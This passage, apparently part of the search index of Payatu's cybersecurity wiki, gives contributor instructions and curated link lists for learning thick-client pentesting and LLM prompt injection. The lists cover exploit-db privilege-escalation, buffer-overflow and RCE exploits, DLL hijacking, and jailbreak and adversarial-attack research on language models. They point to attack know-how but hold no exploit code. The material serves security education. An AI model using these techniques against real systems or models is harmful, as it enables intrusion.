directory in docs directory. Add a new file inside the newly created directory called _index.md with the following content in it.\n--- title: \u0026lt;!-- Category Name Here. --\u0026gt; bookCollapseSection: true --- \u0026lt;!-- Your content here. --\u0026gt; a new category will be created.\nEach Category will contain an images/ folder.\nDirectory Structure -\ncontent/ ├─ docs/ │ ├─ category-name/ │ │ ├─ images/ │ │ ├─ _index.md Create a New Sub Category To create a sub category in side a category, we need to create a directory inside the main category, which will contain all the different markdown files of different content.\n--- title: \u0026lt;!-- SubCategory Name Here. --\u0026gt; bookCollapseSection: true --- \u0026lt;!-- Your content here. --\u0026gt; To add a new page Each page will contain the following content -\n--- title: \u0026lt;!-- Title of the page here. --\u0026gt; --- \u0026lt;!-- Your content here. --\u0026gt; Images can be used in each page by using the complete link - content/docs/\u0026lt;category-name\u0026gt;/images/\u0026lt;image-name\u0026gt;.\u0026lt;extension\u0026gt; Example -\n![Alt text](content/docs/cloud-security/images/image.png) Infrastructure # The wiki is built on the Hugo. If you can help with any improvements, feature additions, etc. You can create an Issue and we can discuss it over there.\nAdditional Features # Linking an Internal Document {{ \u0026lt;/* relref \u0026#34;\u0026lt;!-- document/path/here --\u0026gt;\u0026#34; */\u0026gt; }} It will help hugo internally process the document easily.\nOther cool elements to be added can be found in the shortcode section.\nTest Locally # Clone the repository to make changes locally -\ngit clone git@github.com:payatu/cybersec-wiki.git git submodule init git submodule update Install Hugo Extended Latest Version.\nFrom the parent location of repository where the source code is, run\nhugo server It will start a local server to test the changes that you have made, in terms of look, feel and content.\nOnce satisfied with the changes made, push the changes to GitHub, it will ask you to create a fork of the repository and make changes there.\nCreate a Pull Request and if everything looks fine, the payatu team will be merging the content to the Cyber Security Wiki.\n"},{"id":6,"href":"/docs/machine-learning/learning/","title":"Learning Process","section":"Machine Learning","content":" Contents # OWASP Top 10 for Large Language Model Applications Prompt Injection Articles Prompt Injection Videos Prompt Injection CTF LLM Hacker Handbook Videos AI Attack Surface Map Research Papers OWASP Top 10 for Large Language Model Applications # https://owasp.org/www-project-top-10-for-large-language-model-applications/ Prompt Injection Articles # https://josephthacker.com/ai/2023/04/19/prompt-injection-and-mitigations.html https://josephthacker.com/ai/2023/08/25/prompt-injection-primer.html https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/ https://www.lakera.ai/insights/what-is-prompt-injection Prompt Injection Videos # Attacking LLM - Prompt Injection Accidental LLM Backdoor - Prompt Tricks Defending LLM - Prompt Injection Prompt Injection 101 - Understanding Security Risks in LLM Prompt Injection CTF # GPT Prompt Attack Double Speak Chat LLM Hacker Handbook # https://doublespeak.chat/#/handbook Videos # AI Hacking 🔥 OWASP Top 10 Vulnerabilities in LLM Applications Fredrik Heiding - Devising and Detecting Phishing: Large Language Models vs. Smaller Human Models Daniel Miessler and Rez0: Hacking with AI (Ep. 24) AI and hacking - opportunities and threats - Joseph “rez0” Thacker AI Attack Surface Map # The AI Attack Surface Map v1.0 Research Papers # Prompt Injection attack against LLM-integrated Applications Exploiting Programmatic Behavior of LLMs: Dual-Use Through Standard Security Attacks Universal and Transferable Adversarial Attacks on Aligned Language Models "},{"id":7,"href":"/docs/application-security/thick-client/learningprocess_linux/","title":"Learning Process - Linux","section":"Thick Client","content":" Learning Resources # Contents # Vulnerability ranking Common Vulnerabilities OWASP Desktop App Security Top 10 # https://owasp.org/www-project-desktop-app-security-top-10/\nSome Common Vulnerabilities # https://payatu.com/blog/thick-client-penetration-testing/\nhttps://payatu.com/blog/pentesting-linux-thick-client-applications/\nCode Execution\nhttps://www.exploit-db.com/exploits/50385 https://www.exploit-db.com/exploits/47231 https://www.exploit-db.com/exploits/51331 (Via Missing file) Buffer Overflow\nhttps://www.exploit-db.com/exploits/47178 Out of bound crash\nhttps://www.exploit-db.com/exploits/35081 Forensics\n/proc/[PID]/ directory https://docs.kernel.org/filesystems/proc.html#:~:text=The%20directory%20%2Fproc%20contains LD_PRELOAD attack https://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/ Generating and analyzing core dumps https://opensource.com/article/20/8/linux-dump https://opensource.com/article/20/7/procdump-linux https://www.cse.unsw.edu.au/~learn/debugging/modules/gdb_coredumps/ Network traffic analysis\nTraffic capture https://opensource.com/article/20/1/wireshark-linux-tshark https://opensource.com/article/18/10/introduction-tcpdump Proxy https://linuxhint.com/proxychains-tutorial/ Privilege Escalation\nhttps://www.exploit-db.com/exploits/51180 https://www.exploit-db.com/exploits/50689 "},{"id":8,"href":"/docs/application-security/thick-client/learningprocess_windows/","title":"Learning Process - Windows","section":"Thick Client","content":" Learning Resources # Contents # Sample vulnerable thick client applications Vulnerability ranking Common Vulnerabilities Video Reference Sample vulnerable Thick Client application # DVTA - Damn Vulnerable Thick Client Application # https://github.com/srini0x00/dvta\nhttps://www.hackingarticles.in/thick-client-pentest-lab-setup-dvta-2/ https://www.hackingarticles.in/thick-client-pentest-lab-setup-dvta-part-2/ https://parsiya.net/blog/2018-07-15-dvta-part-1-setup/ BetaBank # https://github.com/NetSPI/BetaFast/tree/master/BetaBank\nBetaFast # https://github.com/NetSPI/BetaFast/tree/master/BetaFast\nhttps://medium.com/@abhishek.offsec/hacking-the-betafast-betabank-thick-client-applications-fe8b6226f84a OWASP Desktop App Security Top 10 # https://owasp.org/www-project-desktop-app-security-top-10/\nSome Common Vulnerabilities # https://payatu.com/blog/thick-client-penetration-testing/\nDLL Hijacking\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking https://hackerone.com/reports/1636566 https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/ https://www.cyberark.com/resources/threat-research-blog/dllspy-tighten-your-defense-by-discovering-dll-hijacking-easily https://www.exploit-db.com/exploits/51678 DLL Side-loading\nhttps://www.mandiant.com/resources/reports/dll-side-loading-thorn-side-anti-virus-industry https://helpdeskgeek.com/windows-11/what-is-the-winsxs-folder-why-is-it-huge-and-how-to-cleanup/ Sensitive credentials leaked in source code on Github\nhttps://thehackernews.com/2023/01/github-breach-hackers-stole-code.html Application data being stored in System Registry\nhttps://www.praetorian.com/blog/how-to-detect-and-dump-credentials-from-the-windows-registry/ https://medium.com/@rahisul/windows-registry-769191adce1e Unsigned .exe or .dll files\nhttps://abhigowdaa.medium.com/unsigned-dll-exe-files-the-validity-of-the-certificates-86baf8722454 Unencrypted application data in network during transmission\nUse of Wireshark to analyze traffic https://www.netspi.com/blog/technical/thick-application-penetration-testing/introduction-to-hacking-thick-clients-part-2-the-network/ Unecrypted application data stored in the computer\nhttps://blog.appsecco.com/breaking-bad-tearing-apart-a-thick-client-app-to-steal-data-7e44f8698b2a https://stackoverflow.com/questions/33288/protecting-api-secret-keys-in-a-thick-client-application https://www.exploit-db.com/exploits/51540 (Clear Text Password Storage and Account Takeover) Memory protection checks\nhttps://blog.securelayer7.net/static-analysismemory-forensics-reverse-engineering-thick-client-penetration-testing-part-4/ https://msrc.microsoft.com/blog/2010/12/on-the-effectiveness-of-dep-and-aslr/ https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-memory-protection-features/ba-p/259046 https://www.exploit-db.com/exploits/49959 (Buffer Overflow SEH + DEP Bypass using JOP) Symlink attack\nhttps://www.exploit-db.com/papers/13199 (Crafting Symlinks for Fun and Profit) https://www.darkrelay.com/post/thick-client-penetration-testing https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/ https://www.exploit-db.com/exploits/51151 (Local Privilege Escalation) https://www.exploit-db.com/exploits/48079 (Windows 10 Privilege Escalation) Insecure File/Folder Permissions\nhttps://www.exploit-db.com/exploits/51682 (Insecure Folders Permissions) https://ss64.com/nt/icacls.html (icacls) https://www.exploit-db.com/exploits/51680 (Remote Work Insecure Files and Folders) https://www.exploit-db.com/exploits/51453 (ACL Service LPE) https://www.exploit-db.com/exploits/51479 (Weak Service Privilege Escalation) https://www.exploit-db.com/exploits/51410 (Local Privilege Escalation / Incorrect Access Control) Unquoted service path\nhttps://www.exploit-db.com/exploits/48174 https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae Buffer Overflow\nhttps://www.exploit-db.com/exploits/50510 (Denial of Service (PoC)) https://www.exploit-db.com/exploits/50999 (Remote Stack Buffer Overflow (SEH)) https://www.exploit-db.com/exploits/50470 (Buffer Overflow (SEH) - Bind Shell) https://www.exploit-db.com/exploits/51223 (Buffer Overflow - Opens Calculator) https://www.exploit-db.com/exploits/51196 (Buffer Overflow (DoS)) https://www.exploit-db.com/exploits/51102 (Buffer overflow DoS) Denial of Service\nhttps://www.exploit-db.com/exploits/50266 (\u0026lsquo;Multiple\u0026rsquo; Denial of Service (PoC)) https://security.stackexchange.com/questions/33604/why-is-application-crash-considered-insecure#:~:text=An%20attacker%20may%20try%20to,system%20and%20its%20internal%20details. https://learn.microsoft.com/en-us/archive/msdn-magazine/2007/november/analyze-crashes-to-find-security-vulnerabilities-in-your-apps Remote code execution\nhttps://www.exploit-db.com/exploits/50972 https://www.exploit-db.com/exploits/50974 Video reference # Cobalt Core Academy: Thick Client Pentesting with Harsh Bothra "},{"id":9,"href":"/docs/application-security/thick-client/tools_linux/","title":"Tools - Linux","section":"Thick Client","content":" Tools used in Linux Thick client pentesting # Information Gathering # file (https://man7.org/linux/man-pages/man1/file.1.html) ldd (https://man7.org/linux/man-pages/man1/ldd.1.html) strings (https://man7.org/linux/man-pages/man1/strings.1.html) apt (https://manpages.ubuntu.com/manpages/xenial/man8/apt.8.html) strace (https://man7.org/linux/man-pages/man1/strace.1.html) ltrace (https://man7.org/linux/man-pages/man1/ltrace.1.html) pspy (https://github.com/DominicBreuker/pspy) Reverse Engineering # IDA/IDA Pro (https://hex-rays.com/ida-free/, https://hex-rays.com/ida-pro/) Ghidra (https://github.com/NationalSecurityAgency/ghidra) Memory Analysis # gcore (https://man7.org/linux/man-pages/man1/gcore.1.html) kill (https://man7.org/linux/man-pages/man1/kill.1.html) Procdump (https://github.com/Sysinternals/ProcDump-for-Linux) gdb (https://man7.org/linux/man-pages/man1/gdb.1.html) Traffic Analysis # Wireshark (https://www.wireshark.org/) Tshark (https://www.wireshark.org/docs/man-pages/tshark.html) tcpdump (https://www.tcpdump.org/manpages/tcpdump.1.html) proxychains (https://github.com/haad/proxychains) Burp Suite (https://portswigger.net/burp) mitm relay (https://github.com/jrmdev/mitm_relay) "},{"id":10,"href":"/docs/application-security/thick-client/tools_windows/","title":"Tools - Windows","section":"Thick Client","content":" Tools used in Windows Thick client pentesting # Information Gathering # CFF explorer (https://ntcore.com/?page_id=388) SysInternal Suite (https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) Strings Process Monitor Process Explorer Sigcheck Decompile and Debug # DnSpy (https://github.com/dnSpy/dnSpy/releases) ILSpy (https://github.com/icsharpcode/ILSpy/releases) DotPeek (https://www.jetbrains.com/decompiler/download/#section=web-installer) Frida (https://github.com/frida/frida/releases) Ghidra (https://github.com/NationalSecurityAgency/ghidra/releases) WinDbg (https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools) Network sniffing and Proxy # Wireshark (https://www.wireshark.org/download.html) TCPView (https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview) EchoMirage (https://sourceforge.net/projects/echomirage.oldbutgold.p/) Burp Suite NoPE proxy Fiddler (https://www.telerik.com/fiddler/fiddler-classic) MiTM relay (https://github.com/jrmdev/mitm_relay) System Testing # Symbolic Link Testing tools (https://github.com/googleprojectzero/symboliclink-testing-tools) "}]